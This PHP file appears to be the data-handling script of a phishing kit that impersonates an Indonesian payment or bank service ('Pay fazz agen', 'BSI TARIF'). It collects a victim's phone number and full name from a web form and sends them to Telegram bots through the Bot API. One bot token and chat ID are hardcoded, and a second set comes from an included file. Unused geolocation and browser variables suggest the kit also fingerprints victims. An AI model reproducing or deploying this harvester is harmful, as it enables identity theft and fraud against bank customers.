<?php
include "/telegram.php";
session_start();

$nohp = $_POST['nohp'];
$nama = $_POST['nama'];

$_SESSION['nohp'] = $nohp;
$_SESSION['nama'] = $nama;

    $negara = $kal['country'];
    $region = $kal['regionName'];
    $city = $kal['city'];
    $latitude = $kal['lat'];
    $longtitude = $kal['lon'];
    $timezone = $kal['timezone'];
    $perdana = $kal['isp'];
    $ipaddress = $kal['query'];
    $platform = $infos['platfrm_name'];
    $osversi = $infos['platfrm_vers'];
    $browser = $infos['browser_name'];

$message = "

•••••••••••••••••••••••••••••••••••••••••
   | 🇮🇩 Pay fazz agen🇮🇩 |
•••••••••••••••••••••••••••••••••••••••••

• No telpon: ".$nohp."
• nama Lengkap: ".$nama."

••••••••••••••••••••••••••••••••••••••••
     |    @     BSI TARIF     @  |
••••••••••••••••••••••••••••••••••••••••
 ";
function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
$id_telegram1 = "6323146855";
$id_botTele1  = "7566722423:AAHLRp27aRt_3XV1P7sdnNOkm6Ei0ZPcAiA";

sendMessage($id_telegram1, $message, $id_botTele1);

sendMessage($id_telegram, $message, $id_botTele);
?>
